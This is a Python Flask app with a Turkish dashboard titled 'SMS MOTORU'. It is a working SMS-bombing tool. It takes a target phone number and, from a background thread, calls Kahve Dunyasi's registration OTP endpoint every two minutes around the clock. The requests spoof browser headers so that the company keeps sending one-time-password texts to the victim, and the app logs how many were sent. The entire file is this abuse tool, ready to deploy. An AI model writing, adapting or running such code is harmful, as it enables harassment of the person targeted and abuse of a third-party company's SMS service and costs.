from flask import Flask, render_template_string, request, redirect, url_for
from gunicorn.app.base import BaseApplication
import requests
import time
import os

app = Flask(__name__)

target_phone = ""
logs = []
sms_count = 0

def send_kahve_dunyasi_otp():
    global target_phone, logs, sms_count
    if not target_phone:
        return

    url = "https://www.kahvedunyasi.com/api/v1/auth/register-otp"
    payload = {"mobile_number": target_phone, "country_code": "90"}
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "tr-TR,tr;q=0.9",
        "Origin": "https://www.kahvedunyasi.com",
        "Referer": "https://www.kahvedunyasi.com/",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
    }

    try:
        response = requests.post(url, json=payload, headers=headers, timeout=15)
        sms_count += 1
        if response.status_code in [200, 201]:
            status = f"[{sms_count}] Gonderildi -> Basarili (HTTP {response.status_code})"
        else:
            status = f"[{sms_count}] Gonderildi -> Basarisiz (HTTP {response.status_code})"
        logs.append(f"[{time.strftime('%H:%M:%S')}] {status}")
    except requests.exceptions.ConnectionError:
        logs.append(f"[{time.strftime('%H:%M:%S')}] Baglanti Hatasi - Sunucuya ulasilamiyor")
    except requests.exceptions.Timeout:
        logs.append(f"[{time.strftime('%H:%M:%S')}] Zaman Asimi - Istek zaman asimina ugradi")
    except Exception:
        logs.append(f"[{time.strftime('%H:%M:%S')}] Bilinmeyen Hata")

    if len(logs) > 50:
        logs.pop(0)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMS Panel</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0d1117; color: #c9d1d9; min-height: 100vh; display: flex; justify-content: center; align-items: flex-start; padding: 40px 20px; }
        .container { width: 100%; max-width: 480px; }
        .header { text-align: center; margin-bottom: 25px; }
        .header h1 { font-size: 22px; font-weight: 700; color: #58a6ff; letter-spacing: 1px; }
        .header p { font-size: 13px; color: #8b949e; margin-top: 5px; }
        .card { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 25px; margin-bottom: 15px; }
        .card-title { font-size: 13px; font-weight: 600; color: #8b949e; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 15px; }
        .status-badge { display: inline-flex; align-items: center; gap: 8px; padding: 8px 14px; border-radius: 20px; font-size: 13px; font-weight: 600; margin-bottom: 15px; }
        .status-active { background: #1a4731; color: #3fb950; border: 1px solid #238636; }
        .status-waiting { background: #2d1f0e; color: #d29922; border: 1px solid #9e6a03; }
        .dot { width: 8px; height: 8px; border-radius: 50%; }
        .dot-green { background: #3fb950; animation: pulse 1.5s infinite; }
        .dot-yellow { background: #d29922; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
        input[type="text"] { width: 100%; padding: 12px 15px; background: #0d1117; border: 1px solid #30363d; border-radius: 8px; color: #c9d1d9; font-size: 15px; outline: none; transition: border-color 0.2s; margin-bottom: 12px; }
        input[type="text"]:focus { border-color: #58a6ff; }
        input[type="text"]::placeholder { color: #484f58; }
        button { width: 100%; padding: 12px; background: #238636; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 15px; font-weight: 600; transition: background 0.2s; }
        button:hover { background: #2ea043; }
        .stats { display: flex; gap: 10px; margin-bottom: 15px; }
        .stat-box { flex: 1; background: #0d1117; border: 1px solid #30363d; border-radius: 8px; padding: 12px; text-align: center; }
        .stat-value { font-size: 22px; font-weight: 700; color: #58a6ff; }
        .stat-label { font-size: 11px; color: #8b949e; margin-top: 3px; }
        .log-box { background: #0d1117; border: 1px solid #30363d; border-radius: 8px; padding: 15px; font-family: 'Courier New', Courier, monospace; font-size: 12px; line-height: 1.6; height: 220px; overflow-y: auto; color: #3fb950; }
        .log-box::-webkit-scrollbar { width: 4px; }
        .log-box::-webkit-scrollbar-track { background: #0d1117; }
        .log-box::-webkit-scrollbar-thumb { background: #30363d; border-radius: 2px; }
        .log-entry { margin-bottom: 4px; }
        .log-entry.error { color: #f85149; }
        .log-entry.info { color: #58a6ff; }
        .footer { text-align: center; font-size: 11px; color: #484f58; margin-top: 10px; }
    </style>
    <script>setTimeout(() => { if (!document.querySelector('input:focus')) location.reload(); }, 20000);</script>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>SMS MOTORU</h1>
            <p>Kahve Dunyasi OTP Sistemi</p>
        </div>
        <div class="card">
            <div class="card-title">Sistem Durumu</div>
            {% if phone %}
            <div class="status-badge status-active"><div class="dot dot-green"></div>AKTIF - +90 {{ phone }}</div>
            {% else %}
            <div class="status-badge status-waiting"><div class="dot dot-yellow"></div>NUMARA BEKLENIYOR</div>
            {% endif %}
            <div class="stats">
                <div class="stat-box"><div class="stat-value">{{ sms_count }}</div><div class="stat-label">Toplam Gonderim</div></div>
                <div class="stat-box"><div class="stat-value">2</div><div class="stat-label">Dakika Aralik</div></div>
                <div class="stat-box"><div class="stat-value">24</div><div class="stat-label">Saat Surekli</div></div>
            </div>
        </div>
        <div class="card">
            <div class="card-title">Numara Ayarla</div>
            <form method="POST">
                <input type="text" name="phone" placeholder="5051234567 (basi olmadan)" value="{{ phone }}">
                <button type="submit">Kaydet ve Baslat</button>
            </form>
        </div>
        <div class="card">
            <div class="card-title">Canli Log</div>
            <div class="log-box" id="logBox">
                {% for log in logs %}
                <div class="log-entry {% if 'Hata' in log or 'Asimi' in log %}error{% elif 'guncellendi' in log %}info{% endif %}"> > {{ log }}</div>
                {% else %}
                <div style="color: #484f58;">Henuz gonderim yapilmadi. Numara girerek baslatin.</div>
                {% endfor %}
            </div>
        </div>
        <div class="footer">Her 20 saniyede bir otomatik yenilenir | Render Web Service</div>
    </div>
    <script>const lb = document.getElementById('logBox'); if (lb) lb.scrollTop = lb.scrollHeight;</script>
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def index():
    global target_phone, logs, sms_count
    if request.method == 'POST':
        new_phone = request.form.get('phone', '').strip()
        if new_phone:
            target_phone = new_phone
            logs.append(f"[{time.strftime('%H:%M:%S')}] Hedef numara guncellendi: +90{target_phone}")
        return redirect(url_for('index'))

    return render_template_string(
        HTML_TEMPLATE,
        phone=target_phone,
        logs=reversed(list(logs)),
        sms_count=sms_count
    )

class GunicornApp(BaseApplication):
    def __init__(self, flask_app, options=None):
        self.options = options or {}
        self.application = flask_app
        super().__init__()

    def load_config(self):
        for key, value in self.options.items():
            self.cfg.set(key.lower(), value)

    def load(self):
        return self.application

    def post_fork(self, server, worker):
        import threading
        def scheduler():
            while True:
                time.sleep(120)
                send_kahve_dunyasi_otp()
        t = threading.Thread(target=scheduler, daemon=True)
        t.start()

if __name__ == "__main__":
    port = os.environ.get("PORT", "5000")
    options = {
        "bind": f"0.0.0.0:{port}",
        "workers": 1,
    }
    GunicornApp(app, options).run()
